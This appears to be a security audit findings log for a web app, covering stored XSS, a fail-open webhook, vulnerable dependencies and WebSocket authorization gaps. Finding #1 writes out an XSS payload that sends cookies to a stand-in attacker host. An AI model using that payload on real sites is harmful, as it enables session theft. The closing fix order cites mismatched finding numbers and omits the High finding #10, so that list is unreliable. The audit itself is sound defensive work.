# Security Audit — 2026-09-02

Findings-only log for a future fix PR. No code was changed as part of this audit.

## Scope & method

Targeted review of the tracked codebase (not a full pentest, no live exploitation against a
running instance). Two passes:

- **Round 1**: three parallel sub-agent audits (auth/session, input validation/injection,
  API/infra hardening) were started but failed immediately on an account-wide API rate
  limit — that round was done by hand instead (`grep`/`read`/`npm audit`), and two items
  were explicitly left as unresolved "needs follow-up" rather than guessed at: the
  `/auth?redirect=` open-redirect question, and messaging-thread authorization.
- **Round 2** (this update): three more targeted sub-agent audits ran successfully in the
  background (messaging/WebSocket authorization, XSS sweep + open-redirect resolution, mass
  assignment + admin-route authorization), in parallel with direct manual checks (SSRF, file
  upload validation, payment/price tampering, account-enumeration timing). Findings are
  appended in the order they were confirmed, not strictly re-sorted by severity — check the
  `[severity]` tag on each heading rather than assuming position implies rank.

Even after two rounds, treat this as thorough-but-not-exhaustive rather than a complete
audit — a 100+ route-file codebase this size still has corners neither pass reached.

**Known limitation**: this session only has a **shallow git clone** (~78 commits from
2026-08-21 onward). Historical-secret scanning below only covers that window. GitGuardian
(already wired into CI on every push — see `.gitguardian.yml`) scans full history on
GitHub's side and has not alerted; that's the stronger signal for anything older.

---

## Findings, most severe first

### 1. [High] Stored XSS in the shortlist drawer via marketplace listing/supplier/package names

- **File**: `public/assets/js/components/shortlist-drawer.js`, `renderItem()` — the `alt="${item.name}"`
  attribute and `<h3 class="shortlist-item-name">${item.name}</h3>` element both interpolate
  `item.name` directly into an `innerHTML` template string with **no escaping**
  (`render()` assigns the result straight to `content.innerHTML`).
- **Confirmed data flow (not hypothetical)**: `item.name` is populated from fully
  user-supplied content at three call sites — `public/assets/js/marketplace.js:1228`
  (`name: listing.title`, a marketplace listing title anyone can set when creating a
  listing via `/supplier/marketplace-new-listing`), `public/assets/js/pages/package-init.js:344`
  (`name: supplier.name`) and `:461` (`name: pkg.title`), and
  `public/assets/js/pages/suppliers-init.js`/`marketplace-init.js` (similar). **None of
  these pass the value through escaping before calling `shortlistManager.addItem()`.**
- **The escaping convention already exists and is used correctly everywhere else**:
  `marketplace.js` has its own `escapeHtml()` helper and uses it consistently for the exact
  same `listing.title` value when rendering the main listing detail view (lines 510, 518,
  553, 570-571, 575-576) — the shortlist drawer is the one rendering path that was missed.
- **Exploit scenario**: any authenticated user creates a marketplace listing titled e.g.
  `<img src=x onerror=fetch('https://evil.example/steal?c='+document.cookie)>`. Any other
  user (buyer, or an admin reviewing listings) who clicks the shortlist heart on that
  listing and later opens their shortlist drawer executes the payload in their own
  session. Confirmed via `shortlist-manager.js` that shortlist items are synced to the
  server per-user, so this is genuinely **stored** XSS — it persists and re-fires every
  time the victim opens their shortlist until they remove the item.
- **Fix direction**: escape `item.name` (and any other interpolated item field —
  `item.category`, `item.location`, `priceHint`) in `shortlist-drawer.js`'s `renderItem()`
  before interpolating into the template string, using the same `escapeHtml()` pattern
  `marketplace.js` already uses, or switch to building the DOM with `textContent`
  assignments instead of `innerHTML` for user-controlled fields.

### 2. [Medium] Postmark webhook fails **open** when credentials aren't configured, unlike every other webhook in the app

- **File**: `routes/webhooks.js:46-71` (`POST /api/webhooks/postmark`)
- **Issue**: If `POSTMARK_WEBHOOK_USER`/`POSTMARK_WEBHOOK_PASS` aren't set, the handler logs
  `⚠️ WARNING: Webhook authentication not configured in production!` and then **falls
  through and processes the request anyway** (line 68-71, no `return`). Anyone who finds
  the endpoint can POST forged `Delivery`/`Bounce`/`SpamComplaint`/`SubscriptionChange`
  events with no auth at all.
- **Why it matters**: forged `SubscriptionChange` events could unsubscribe arbitrary real
  users from email; forged `Bounce`/`SpamComplaint` events could pollute delivery-health
  tracking or trigger internal suppression logic against a victim's address (a targeted
  denial-of-service on their email delivery).
- **Inconsistency**: every _other_ webhook in this codebase fails **closed** in production —
  Stripe (`routes/payments.js:309-312`, `routes/subscriptions-v2.js:855-856`) and the
  MongoDB Atlas webhook (`webhooks/mongodbWebhookHandler.js:294-301`, which even has the
  comment _"Fail closed in production: never process unsigned webhooks"_) both hard-reject
  with a 400 if their secret is unset. Postmark is the one exception.
- **Fix direction**: mirror the Stripe/MongoDB pattern — `if (!webhookUser || !webhookPass) { if (NODE_ENV === 'production') return res.status(401)...; else warn-and-continue; }`.

### 3. [High, no upstream fix] `xlsx` (SheetJS) — two known high-severity CVEs, dependency abandoned on npm

- **File**: `package.json:149` (`"xlsx": "^0.18.5"`), used in export/import features.
- **CVEs**: Prototype Pollution ([GHSA-4r6h-8v6p-xvw6](https://github.com/advisories/GHSA-4r6h-8v6p-xvw6)),
  ReDoS ([GHSA-5pgg-2g8v-p4x9](https://github.com/advisories/GHSA-5pgg-2g8v-p4x9)). `npm audit`
  reports `fixAvailable: false` — SheetJS stopped publishing patched releases to npm; fixes
  only ship via their own CDN.
- **Mitigating factor already in the codebase**: `.env.example` documents
  `DISABLE_XLSX_EXPORT=true` to disable XLSX export and fall back to CSV in hardened
  environments — worth confirming this is actually set in production, or better, replacing
  the dependency.
- **Fix direction**: either (a) migrate to SheetJS's CDN-distributed patched build per their
  own advisory, (b) switch to a maintained alternative (e.g. `exceljs`), or (c) confirm
  `DISABLE_XLSX_EXPORT=true` in production and accept CSV-only export as the interim mitigation.

### 4. [Moderate] `@sentry/node` + transitive OpenTelemetry instrumentation packages — 19 moderate advisories, fix requires a major bump

- **File**: `package.json:75` (`"@sentry/node": "^8.0.0"`)
- **Detail**: `npm audit` flags 19 moderate-severity advisories across
  `@opentelemetry/instrumentation-*`, `@opentelemetry/core`, `@opentelemetry/resources`,
  `@sentry/opentelemetry`, `@prisma/instrumentation`, all pulled in transitively by
  `@sentry/node`. Fix is available but is semver-major: `@sentry/node@10.73.0`.
- **Fix direction**: schedule a Sentry v8→v10 upgrade (check their migration guide — likely
  touches `utils/sentry.js` / `sentry-browser-init.js` init code) and re-run `npm audit`
  to confirm the whole subtree clears.

### 5. [Low] Legacy pre-migration data files still tracked in git

- **Files**: `data/audit_logs.json`, `data/messages.json`, `data/notes.json`,
  `data/packages.json`, `data/photos.json`, `data/reports.json`, `data/reviews.json`,
  `data/search_history.json`, `data/suppliers.json`, `data/threads.json`
- **Detail**: `.gitignore` excludes `data/*.json` going forward, but these were committed
  before that rule existed, so they're still tracked. Confirmed by content inspection: this
  is synthetic/seed data from the pre-MongoDB local file-store era (repeated fake reviewer
  names cycling "Sarah M." / "James & Emily" / "Rachel T.", placeholder `@supplier.com`
  emails), **not real customer PII**, and `db-unified.js` shows no code path still reads
  this file store — it's vestigial.
- **Fix direction**: `git rm --cached data/*.json` (keep `uk-cities.json` and `sample/`,
  which are explicitly allowlisted as real reference data) for repo hygiene. Low risk, but
  free to fix and reduces the historical-secret-scanning surface for future audits.

### 6. [Low] CSP `connect-src` (and `img-src`/`media-src`) include a broad `https:` wildcard

- **File**: `middleware/security.js:108-141` (`configureHelmet`)
- **Detail**: `connectSrc` includes `'https:'` alongside the specific allowlisted hosts
  (Stripe, Google, PostHog, Cloudflare, etc.), meaning page JS can `fetch()`/XHR/WebSocket
  to _any_ HTTPS host, not just the intended ones. Same pattern on `imgSrc`/`mediaSrc`
  (lower risk there — image/media loads can't execute script or read the response).
- **Why it matters**: this doesn't create a vulnerability on its own, but it meaningfully
  weakens CSP's value as _defense-in-depth_ — if an XSS were ever found elsewhere, the
  attacker's injected script could exfiltrate data to any HTTPS endpoint instead of being
  blocked by CSP.
- **Fix direction**: narrow `connectSrc` to the specific hosts already itemized in the same
  list (Stripe, Google, PostHog, Cloudflare, TidyCal) and drop the `'https:'` wildcard;
  requires checking nothing else legitimately needs it first.

### 7. [Low] Timing-based account enumeration on `/login` and `/forgot`

- **Files**: `routes/auth.js:606-660` (`POST /login`), `routes/auth.js:1134-1191` (`POST /forgot`)
- **Detail**: both endpoints correctly return an identical, generic error/response _message_
  regardless of whether the account exists (`'Invalid email or password'` for login;
  `{ ok: true, message: 'If an account exists...' }` for forgot-password) — the message-content
  side of anti-enumeration is done right. But the _code path length_ still differs measurably
  by account existence:
  - `/login`: a non-existent email returns immediately after one indexed `findOne` (line 634-636).
    An existing email with a wrong password additionally runs `bcrypt.compare()` (line 649) —
    bcrypt is deliberately slow by design (cost factor 10, tens of ms), so this is a real,
    measurable timing gap between "no such user" and "user exists".
  - `/forgot`: a non-existent email returns immediately (line 1148-1153). An existing email
    additionally signs a JWT, writes to MongoDB, and **awaits a Postmark API network call**
    (line 1175, `await postmark.sendPasswordResetEmail(...)`) before responding — a much larger
    and more reliably-measurable timing gap than the login case.
- **Why it's only Low, not higher**: `strictAuthLimiter`/`passwordResetLimiter` (10 and 5
  requests per 15 min respectively) sharply limit how many timing samples a single-IP attacker
  can gather, so this isn't practically exploitable at scale by a lone attacker — but it's a
  real, textbook side-channel and cheap to close.
- **Fix direction**: on the "not found" branch of each, perform an equivalent-cost dummy
  operation before responding — e.g. `await bcrypt.compare(password, DUMMY_HASH)` in `/login`,
  and either await a no-op delay calibrated to typical email-send latency or (better) make the
  email send fire-and-forget (don't `await` it) in `/forgot` so both branches return in
  comparable time regardless of what happens after the response is sent.

### 8. [Info] Registration reveals "Email already registered" (routes/auth.js:320,324)

- Standard message-based enumeration on the signup path specifically (distinct from the
  timing issue above). This is a common, debatable industry trade-off — many production
  apps accept this rather than silently "succeeding" on a duplicate email, since the UX
  cost of silent failure is high and pure signup-enumeration is lower severity than
  login-enumeration. Flagging for completeness/awareness, not urging a fix.

### 9. [Info / needs follow-up] Open-redirect on `/auth?redirect=...` not confirmed either way

- **Context**: this pattern is used across the app (e.g. marketplace's "Create new listing"
  CTA: `/auth?redirect=%2Fsupplier%2Fmarketplace-new-listing`). Server-side `routes/auth.js`
  has no `res.redirect` using this param, so the redirect is handled client-side, but I
  could not locate the specific JS file that reads `?redirect=` and performs the navigation
  in the time available this pass (it isn't in any of the `public/assets/js/pages/auth-*.js`
  / `auth-*.js` files I checked).
- **Risk if unvalidated**: an attacker could craft `/auth?redirect=https://evil-lookalike.com`
  and, after a real login, silently send the victim to a phishing page.
- **Fix direction**: find the post-login redirect handler and confirm it only accepts a
  same-origin relative path (e.g. starts with `/` and not `//`) before navigating; this needs
  a dedicated follow-up look, not assumed broken or assumed fine.

### 10. [High, conditional on `WEBSOCKET_MODE=v1`] Legacy WebSocket server has a completely unauthenticated room-join, exposing private message content if active

- **File**: `websocket-server.js:139-142` (`socket.on('join', room => { socket.join(room); ... })`)
- **Detail**: registered unconditionally on every socket connection, with **no check of
  `socket.userId`, no room-name validation, and no ownership/participant lookup at all**. An
  anonymous, unauthenticated socket.io client can connect and immediately
  `emit('join', { room: 'user:<victim-user-id>' })`.
- **Why it's exploitable**: `emitToUser()` (`websocket-server.js:274-276`) broadcasts to
  `io.to('user:' + userId)`. `routes/messenger-v4.js`'s `emitToConversation()` helper
  (line 318-333) falls back to per-participant `emitToUser` whenever the active WS server
  lacks an `emitToConversation` method — which v1 does. So on v1, new-message content,
  edits, deletes, reactions, read receipts, and conversation updates for **any** user are
  delivered to whoever occupies `user:<targetId>` — fully attacker-controlled via the
  unchecked `join` handler. A second instance of the identical bug: `messenger:join`
  (`websocket-server.js:192-197`) lets any socket join `messenger:${conversationId}` the
  same way, with zero checks.
- **Why "conditional" rather than confirmed-live**: v1 only activates when the operator
  explicitly sets `WEBSOCKET_MODE=v1` — the documented and actual default is `v2`
  (`.env.example:218`, `server.js:1337`), and `server.js:1362` only constructs
  `new WebSocketServer(server)` inside `if (WEBSOCKET_MODE === 'v1')`. **v2 does not have
  this bug** — its equivalent `messenger:v4:join-conversation` handler
  (`websocket-server-v2.js:174-236`) correctly requires `socket.userId` and calls
  `isConversationParticipant()` (a real MongoDB check against
  `conversations_v4.participants.userId`, fail-closed if the DB isn't attached) before
  allowing the join. But there's no lint/CI guard stopping `WEBSOCKET_MODE=v1` from being
  set in any environment, and the code is kept "for backwards compatibility" — so this is a
  live risk to track, not dead code to ignore.
- **Fix direction**: either delete `websocket-server.js` (v1) entirely if nothing still
  needs it, or add the same authenticated-participant check v2 already has to its `join` and
  `messenger:join` handlers before allowing `socket.join()`.

### 11. [Low, currently unreachable] `chat:v5:join-conversation` in the default v2 WebSocket server has no auth/ownership check, but the feature is unwired

- **File**: `websocket-server-v2.js:272-280`
- **Detail**: unlike the `messenger:v4:*` handlers nine lines above it (which check
  `socket.userId`), this handler does `if (data && data.conversationId) { socket.join(...) }`
  with no authentication and no participant check — any socket can join `chat:v5:<anything>`
  by guessing/knowing the id.
- **Why only Low**: no code anywhere in the repo (routes, services, or `public/` frontend)
  calls the corresponding `broadcastMessage`/`broadcastMessageUpdate`/`broadcastMessageDelete`/
  `broadcastReaction`/`broadcastReadReceipt` methods that would push real content into this
  room — it's currently inert. The only live leak surface is the `chat:v5:typing-start/stop`
  handlers (lines 294-321), which _do_ check `socket.userId` before emitting, so joining
  leaks only typing-indicator pings (userId + userName), not message content.
- **Fix direction**: add the same auth+ownership guard as `messenger:v4:join-conversation`
  before this is ever wired to real message delivery, or remove the dead handlers so they
  can't be silently activated later without the fix.

### 12. [Info, dead code] Two more WebSocket gaps worth knowing about before anyone re-wires messaging

- **Legacy `thread`-shaped v2 handlers never check participation**: `handleMessageSend`,
  `handleThreadRead`, `handleReactionSend`, `handleMessageRead`
  (`websocket-server-v2.js:420-501,588-665`) compute recipients from a thread's
  `participants` list without ever confirming the _sender_ (`socket.userId`) is one of them
  — if wired up, any authenticated user could inject a message into an arbitrary thread. Not
  currently exploitable: `server.js:1386` instantiates v2 with
  `new WebSocketServerV2(server, null, null)` (messaging service hardcoded `null`, per the
  comment at `server.js:1383-1385` — "v2 MessagingService has been removed"), and every one
  of these handlers early-returns on `!this.messagingService`. Flagging so this isn't
  silently reactivated without adding the missing check first.
- **`utils/webSocketMiddleware.js` is entirely orphaned.** It defines a correct, well-formed
  `isThreadParticipant(userId, threadId, messagingService)` (lines 223-255) that properly
  handles both v1 and v2 thread shapes — but nothing in the app (`server.js`,
  `websocket-server.js`, `websocket-server-v2.js`, any route) actually `require()`s this
  file; only two unit tests reimplement an equivalent check inline instead of importing it.
  The real v2 authorization (finding-free, see Verified OK) was written independently and
  inline as `isConversationParticipant()`. Worth flagging because a future engineer could
  reasonably mistake this file's existence for evidence of WS-layer protection — it provides
  none in the live request path today. Either wire it into v1's `join`/`messenger:join`
  handlers (which would also fix finding #10) or delete it to avoid the false sense of
  coverage.

---

## Verified OK (checked, not skipped — no need to re-check unless something changes nearby)

- **No real secrets in tracked files or the available (shallow) git history.** Searched for
  Stripe (`sk_live_`/`sk_test_`/`whsec_`), AWS (`AKIA...`), Google (`AIza...`), GitHub
  (`ghp_`/`github_pat_`), Slack (`xox...`), SendGrid (`SG....`), private key blocks, and
  MongoDB URIs with embedded credentials — every match was a documented placeholder
  (`.env.example`, `docs/`) or an obviously-fake test value (`TESTUSER:TESTPASS`,
  `validpassword`). `.env` is gitignored; only `.env.example` is tracked and contains no
  real values.
- **GitGuardian is live in CI** (`.gitguardian.yml`) with only two narrow, verified-legitimate
  exclusions (test helper files with fake creds; one caps-lock-detection UI false positive).
- **No hardcoded API keys in client-side JS** — Stripe publishable key is fetched at runtime
  via `/api/payments/config`, not baked into static files.
- **JWT_SECRET fallback (`'change_me'`) is guarded, not exploitable.** `server.js:236-249`
  unconditionally `process.exit(1)`s (any environment) if the secret is missing, a known
  placeholder, or under 32 chars; `middleware/auth.js` and `utils/token.js` add their own
  production-specific hard-fail checks too. The app cannot boot with the insecure default.
- **Password hashing**: bcryptjs, cost factor 10 (acceptable). One low-cost (4) hash is used
  only in `routes/e2e-test-support.js`'s test-fixture seeding — see below, this route can't
  run in production.
- **`routes/e2e-test-support.js` is triple-gated**, effectively unreachable outside CI:
  requires `NODE_ENV === 'test'` AND `E2E_MODE === 'full'` to even be mounted
  (`routes/static.js:31-33`), AND the router itself requires a fixed private header
  (`x-eventflow-e2e: backend-suite`) per request.
- **Auth cookies**: `httpOnly: true` always, `sameSite: 'lax'`, `secure` correctly gated to
  production (`middleware/auth.js:43-47,70-72,92-94`).
- **Rate limiting on auth is comprehensive**: distinct named limiters
  (`strictAuthLimiter`, `passwordResetLimiter`, `registrationLimiter`, `tokenLinkLimiter`,
  `authLimiter`) are applied across login, 2FA, forgot-password, reset-password, register,
  email verification, resend-verification, and change-password (`routes/auth.js`).
- **NoSQL injection defense is wired globally**: `express-mongo-sanitize` is applied via
  `middleware/sanitize.js` → `app.use(configureSanitization())` in `server.js:360`
  (confirmed, not just present in `package.json` unused), covering `req.body`/`query`/`params`.
  A second custom middleware strips null bytes from the same three sources
  (`server.js:361`).
- **CORS is a real allowlist, not a wildcard.** `middleware/security.js:225-326` — origin
  checked against `BASE_URL` + `ALLOWED_ORIGINS` + (production only) the two canonical
  `event-flow.co.uk` origins; rejects with 403 in production, warns-but-allows in dev only.
  `credentials: true` is safe here specifically because it's paired with this strict
  allowlist, not a wildcard.
- **Security headers are strong overall**: Helmet-configured CSP with `frame-ancestors: 'none'`,
  `object-src: 'none'`, `script-src` locked to `'self'` + an explicit host allowlist (the two
  legacy inline scripts are pinned by exact SHA-256 hash rather than weakened with
  `'unsafe-inline'` — good practice), HSTS in production only, `X-Frame-Options: deny`,
  `X-Content-Type-Options: nosniff`, a path-aware `Permissions-Policy` (geolocation only on
  `/marketplace`). See finding #6 above for the one weak spot (`connect-src`/`img-src`
  wildcards).
- **HTTPS/canonical-host redirect logic doesn't reflect arbitrary Host headers** —
  `middleware/security.js:413-443` only redirects to a known, hardcoded canonical origin,
  and only for requests whose `Host` header matches one of the two known production hosts;
  unknown hosts pass through unredirected rather than being reflected (avoids a host-header
  open-redirect).
- **Stripe and MongoDB Atlas webhooks fail closed in production** if their signing secret
  is unset (see finding #2 for the one webhook that doesn't).
- **No hardcoded secrets in `railway.json`/`railway.worker.json`/`Procfile`/`docker-compose.yml`**
  (the latter has a hardcoded _local-dev-only_ Mongo password, `eventflow_password` —
  fine, since production uses `MONGODB_URI` pointing at Atlas, not this file).
- **No secrets hardcoded in `.github/workflows/*.yml`** — everything sensitive there
  correctly references `${{ secrets.* }}`.
- **SSRF: no exploitable pattern found.** The one outbound-fetch-to-a-configurable-target
  route (`routes/admin-webhooks-test.js`, an admin "test all webhook integrations" tool)
  builds its target URL **only** from `process.env.BASE_URL`/hardcoded `localhost:{PORT}` —
  never from any request-supplied value — with an explicit code comment showing this was a
  deliberate SSRF-prevention decision, plus `authRequired` + `roleRequired('admin')` +
  `csrfProtection` + audit logging. `services/facebookAuth.service.js`'s fetch calls are
  hardcoded to Facebook's own Graph API host; only query params vary.
- **File upload validation is genuinely robust.** `utils/uploadValidation.js`: real
  magic-byte content-sniffing via the `file-type` package (not the trivially-spoofable
  client-declared `Content-Type`), a fixed allowlist (`ALLOWED_IMAGE_TYPES`: JPEG/PNG/WebP/
  GIF/AVIF/HEIC — **SVG is correctly excluded**, closing the classic uploaded-SVG-XSS vector),
  a decompression-bomb pixel-count cap (25MP default), and EXIF/GPS metadata stripping. Minor
  note, not a finding: on magic-byte detection failure/error, there's an extension-based
  fallback (`detectTypeFromExtension`) — still constrained to the same safe allowlist, so not
  a real gap, just worth knowing it exists.
- **Subscription pricing can't be tampered with client-side.** `config/billingPlans.js`:
  the client can only select a `planId` from a fixed server-side `PLAN_DEFINITIONS` enum
  (validated via `hasOwnProperty` — anything else is rejected); the actual Stripe `priceId`
  used in `checkout.sessions.create` is looked up server-side from that enum, never accepted
  directly from the client. Bonus: `normaliseReturnUrl` in the same file already validates
  Stripe return URLs against same-origin before use — a correct reference implementation of
  the open-redirect check finding #9 asks whether `/auth?redirect=` also does.
- **Marketplace listing ownership checks are correct.** `routes/marketplace.js:366,703,819`
  all verify `listing.userId !== req.user.id && req.user.role !== 'admin'` before allowing
  edit/delete.
- **Messaging (messenger-v4) REST authorization is correct and consistent — the round-1
  "needs follow-up" item is resolved.** Every read/write path in
  `services/messenger-v4.service.js` scopes its MongoDB query to the requester:
  `getConversation()` requires `'participants.userId': userId` in the filter itself (not a
  post-fetch check) and throws "Conversation not found or access denied" otherwise; the same
  pattern covers `sendMessage`, `getMessages`, `editMessage`/`deleteMessage` (sender-only),
  `toggleReaction`, `markAsRead`/`markAsDelivered`, and `searchMessages`. No handler uses the
  vulnerable `{ _id: id }`-only query shape. The admin-only conversation-viewing endpoints
  correctly gate on `req.user.role === 'admin'` before using their no-participant-check
  variants. Conversation listing (`GET /api/v4/messenger/conversations`) is filtered to the
  caller's own conversations, and IDs are non-sequential MongoDB ObjectIds — no thread
  enumeration path found. See finding #10 for the one real gap this pass found in the
  _messaging_ system: not in the REST layer, but in the legacy (non-default) WebSocket
  server's room-join authorization.

---

## Suggested order of work for the fix PR

1. Fix the stored XSS in `shortlist-drawer.js` (#1) — small, isolated, highest-severity, highest-confidence fix.
2. Postmark webhook fail-open (#2) — small, isolated, high-confidence fix.
3. Confirm/set `DISABLE_XLSX_EXPORT=true` in production while evaluating an `xlsx` replacement (#3).
4. Trace and confirm (or fix) the messaging-thread IDOR question (#8) — highest-value unknown.
5. Trace and confirm (or fix) the `/auth?redirect=` open-redirect question (#7).
6. `git rm --cached` the legacy `data/*.json` files (#5) — trivial, no functional impact.
7. Narrow CSP `connect-src` (#6) — needs a bit of manual verification nothing else relies on the wildcard.
8. Plan the `@sentry/node` v8→v10 upgrade (#4) — larger, needs its own testing pass.
